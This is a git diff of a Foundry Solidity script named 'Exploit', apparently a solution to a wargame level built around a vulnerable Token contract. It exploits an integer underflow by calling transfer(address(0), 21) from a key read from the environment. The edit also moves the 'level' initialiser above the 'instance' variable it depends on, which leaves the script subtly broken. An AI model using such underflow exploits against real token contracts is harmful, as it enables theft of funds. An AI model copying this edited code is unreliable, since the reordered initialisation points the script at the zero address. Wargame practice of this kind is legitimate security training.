@@ -8,15 +8,14 @@ import {Token} from "src/05/Token.sol";
 
 contract Exploit is Script {
 
-        address instance = vm.envAddress("INSTANCE_LEVEL5");
-        Token level = Token(instance);        
+        Token level = Token(instance); 
+        address instance = vm.envAddress("INSTANCE_LEVEL5"); 
+        uint256 hacker = vm.envUint("PRIVATE_KEY");   
+        address deployer = vm.rememberKey(hacker);        
         
         function run() external {
-
-            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-
+            vm.startBroadcast(deployer);
             level.transfer(address(0), 21);
-            
             vm.stopBroadcast();
     }
 }
